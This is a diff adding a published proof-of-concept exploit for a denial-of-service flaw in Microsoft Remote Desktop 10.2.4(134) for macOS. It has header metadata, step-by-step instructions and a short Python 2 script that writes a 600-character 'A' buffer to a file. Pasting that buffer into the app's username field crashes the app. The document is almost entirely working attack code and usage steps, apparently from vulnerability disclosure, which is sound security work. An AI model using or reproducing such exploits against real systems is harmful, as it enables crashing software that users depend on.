@@ -1,0 +1,24 @@
+# Exploit Title: Microsoft Remote Desktop 10.2.4(134) - Denial of Service (PoC)
+# Date: 2019/01/24
+# Author: Saeed Hasanzadeh (Net.Hun73r)
+# Twitter: @nethun73r
+# Software Link: https://itunes.apple.com/us/app/microsoft-remote-desktop-10/id1295203466?mt=12
+# Version: 10.2.4(134)
+# Tested on: Mac OS Mojave(10.14.2)
+
+# Proof of Concept:
+# Run the python script, it will create a new file "PoC.txt"
+# Copy the text from the generated PoC.txt file to clipboard
+# Paste the text in the add Desktop > add user account >UserName
+# App will now crash
+
+buffer = "A" * 600
+payload = buffer
+try:
+    f=open("PoC.txt","w")
+    print "[+] Creating %s evil payload.." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
